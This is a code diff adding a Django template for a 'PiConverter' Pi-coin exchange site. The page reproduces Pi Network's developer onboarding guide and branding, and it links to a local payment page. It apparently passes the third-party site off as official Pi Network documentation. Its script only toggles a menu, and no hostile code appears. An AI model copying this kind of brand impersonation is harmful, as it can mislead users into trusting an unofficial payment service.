@@ -1,0 +1,254 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Pi Converter, Blockchain, A Fast And Reliable Way to Exchange Your Pi Coin, Whit Trust And Garantee.." /> 
+    <link rel="canonical" href="https://{{request.path_info}}" />               
+    <meta property="og:site_name" content="PiConverter" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Pi Converter, Blockchain, Community & Developer Platform | Pi Network" />
+<meta property="og:description" content="Pi Converter, Blockchain, A Fast And Reliable Way to Exchange Your Pi Coin, Whit Trust And Garantee." />
+<meta property="og:image" content="https://PiConverter.info{% static '' %}" />
+<meta property="og:locale" content="en_us" />
+<meta property="og:url" content="https://PiConverter.info{{request.path_info}}" />
+<meta name="twitter:site" content="@PiConverter" />
+<meta name="twitter:title" content="" />
+<meta name="twitter:description" content="Pi Converter, Blockchain, A Fast And Reliable Way to Exchange Your Pi Coin, Whit Trust And Garantee.." />
+<meta name="twitter:creator" content="@PiNetwork" />
+<meta name="twitter:image" content="https://{% static '' %}" />
+<meta property="twiter:card" content="summary_large_image" />
+<meta name="twitter:image:alt" content="PiConverter Logo" />
+      <link rel="stylesheet" href="{% static 'piconverterapp/styles/docs.css' %}">
+      <link rel="apple-touch-icon" sizes="180x180" href="{% static 'piconverterapp/favicon.io/apple-touch-icon.png' %}">
+      <link rel="icon" type="image/png" sizes="32x32" href="{% static 'piconverterapp/favicon.io/favicon-32x32.png' %}">
+      <link rel="icon" type="image/png" sizes="16x16" href="{% static 'piconverterapp/favicon.io/favicon-16x16.png' %}">
+      <link rel="manifest" href="{% static 'piconverterapp/favicon.io/site.webmanifest' %}">  
+
+    <title>developer pi browser edition 2023</title>
+</head>
+<body>
+
+    <style>
+        .pay_head{
+            width: 100%;
+            height: 50px;
+            box-sizing: border-box;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 20px;
+            background-color: #f5f5f5;
+            
+        }
+        .pay_head aside{
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            font-size: 20px;
+            font-weight: 500;
+        }
+        .menu_box{
+            width: 50px;
+            height: 100%;
+            color: rebeccapurple;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            justify-content: center;
+        }
+        .menu_box svg{
+            width: 30px;
+            height: 30px;
+        }
+        .all_text{
+            padding: 20px 30px;
+        }
+        .junt{
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            font-weight: 400;
+            border-bottom: 1px solid #f5f5f5;
+            letter-spacing: 1px;
+        }
+        .junt h2{
+            font-weight: 400;
+        }
+        .jks{
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            font-weight: 400;
+            border-bottom: 1px solid #f5f5f5;
+            letter-spacing: 1px;
+            font-size: 15px;
+            line-height: 25px;
+        }
+        @media screen and (max-width:550px) {
+            .jks{
+                font-size: 13px;
+            }
+            .junt p {
+                font-size: 14px;
+                line-height: 25px;
+            }
+        }
+        @media screen and (max-width:400px) {
+            .all_text{
+                padding: 0px 20px;
+            }
+            .junt p{
+                font-size: 13px;
+            }
+            .jks{
+                font-size: 12px;
+            }
+        }
+        .side_bar{
+            width: 100%;
+            height: fit-content;
+            box-sizing: border-box;
+            overflow: hidden;
+            padding: 0px 10px;
+            background-color: #ededed;
+            display: none;
+        }
+        .side_bar a{
+            width: 100%;
+            height: 30px;
+            box-sizing: border-box;
+            overflow: hidden;
+            font-size: 13px;
+            text-decoration: none;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            color: rebeccapurple;
+            
+        }
+        .side_bar a > input{
+            width: 100%;
+            height: 30px;
+            padding: 10px;
+            box-sizing: border-box;
+            background-color: #fff;
+            border: none;
+            overflow: hidden;
+        }
+    </style>
+
+    <header class="pay_head">
+        <aside>
+            Pi Developer Guide
+        </aside>
+
+            <aside class="menu_box" id="menu_box" onclick="side_bar()" >
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-list" viewBox="0 0 16 16">
+                    <path fill-rule="evenodd" d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5m0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5m0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5"/>
+                  </svg>
+        </aside>
+
+    </header>
+    <aside class="side_bar" id="side_bar">
+        <a href="">
+            Welcome
+        </a>
+        <a href="https://pi-apps.github.io/community-develop-guide/docs/importantTopics">
+            Community Support
+        </a>
+        <a href="https://pi-apps.github.io/community-develop-guide/docs/importantTopics">
+            Getting Started
+        </a>
+        <a href="https://pi-apps.github.io/community-develop-guide/docs/importantTopics">
+            Pi Topics
+        </a>
+        <a href="/pi-payment/selection">
+            Pi Core payments
+        </a>
+        <a href="https://pi-apps.github.io/community-develop-guide/docs/importantTopics">
+            <input type="search" name="serch" id="" placeholder="Search Pi Developer Guide">
+        </a>
+        <br>
+        <br>
+    </aside>
+    <section class="all_text">
+        
+        <aside class="junt">
+            <h2>
+             Pi New Developer Onboarding Guide
+            </h2>
+            <p>
+                Welcome to Pi’s home of documentation for new developers. We are excited that you are interested in joining our Ecosystem. This guide is intended to introduce you to all the topics relevant to getting started with building on Pi.
+            </p>
+            <br>
+        
+        </aside>
+        <aside class="jks">
+            <br>
+           <strong> Welcome!</strong>  <br>
+Scroll to read more about Pi Network or head over to the <a href="">Getting Started Checklist</a> to begin building. <br>
+<br>
+<strong>Pi’s Vision</strong> <br>
+Pi vision is to build the world’s most inclusive peer-to-peer ecosystem and online experience, fueled by Pi, the world’s most widely used cryptocurrency. <br>
+<br>
+Pi delivers on the true promise of blockchain: a massive, accessible, and open community powered by the world’s most widely distributed cryptocurrency that enables a robust ecosystem for members, merchants and developers alike. Founded in 2018 by a team of early innovators in blockchain and social computing, with PhDs from Stanford University, Pi Network is a utilities-based ecosystem for third-party apps on a mobile web platform, with widespread (rather than concentrated) token distribution. The blockchain platform offers a mobile-first mining approach, with low financial cost and a light environmental footprint within the crypto space. The community boasts an engaged 35M+ members in over 230 countries or regions.
+<br>
+<br>
+<strong>Pi Network Mobile Apps</strong> <br>
+There are two apps that users are required to download in order to join the ecosystem. <br>
+<br>
+The first is Pi Mining App; this is Pi’s original mining app and the home of Pi’s unique mining mechanism. Downloading Pi App and creating an account allows anyone to participate in the ecosystem and mine Pi.
+<br><br>
+Pi App is available for <a href="">Android</a> and <a href="">iOS.</a>
+<br><br>
+The second is the Pi Browser, which is the mobile web platform for the Pi ecosystem. This is the window through which Pioneers (users and members of the Pi community) experience community developers’ applications. There is a more detailed explanation on the Pi Browser within the “Getting Started” category.
+<br><br>
+Pi Browser is available for <a href="">Android</a> and <a href="">iOS.</a>
+<br><br>
+Developers with Android phones that don’t have access to the Google Play Store can instead use the APKs for <a href="">Pi App</a> and <a href="">Pi Browser.</a>
+<br><br>
+
+<strong>Documentation</strong> <br>
+There are two approaches to onboarding.
+<br><br>
+The first option is to use this guide and move through its various categories. It will cover getting set up all the way through to processing payments. Head over to the <a href="">Getting Started</a> category and start with the Pi Browser Introduction.
+<br><br>
+The second option is to head over to our <a href="">Demo App and Blogs</a> page and check out code that others used to integrate Pi and jump right into getting it setup.
+<br><br>
+<strong>Whitepaper</strong> <br>
+The <a href="">Original Pi Whitepaper</a> was published on PiDay, March 14, 2019. While our original vision remains unchanged, the details of this whitepaper are not fully up to date. On December 28, 2021, along with the release of the Enclosed mainnet, we published three draft chapters of the <a href="">Updated Whitepaper</a>, detailing the Pi token token model and mining mechanism as well as the project’s roadmap.
+<br><br>
+<strong>Developer Terms of Service</strong> <br>
+By accessing or using any part of the Pi Network Developer tools and resources, you agree that you are subject to and will comply with the <a href="">Pi Network Developer Terms of Use.</a>
+<br><br>
+        </aside>
+        <br>
+        <br>
+        <a href="">Back to top</a>
+        <br>
+        <br>
+        <p>
+            Pi Network 2023
+        </p>
+        <br>
+        <a href="">
+            Edit this page on GitHub
+        </a>
+        <br>
+        <br>
+    </section>
+
+    <script>
+        var side = document.getElementById('side_bar')
+        var is_open = false
+        function side_bar() {
+            if (is_open == false) {
+                side.style.display = 'block'
+                is_open = true
+            }
+            else{
+                side.style.display = 'none';
+                is_open = false;
+            }
+        }
+    </script>
+</body>
+</html>
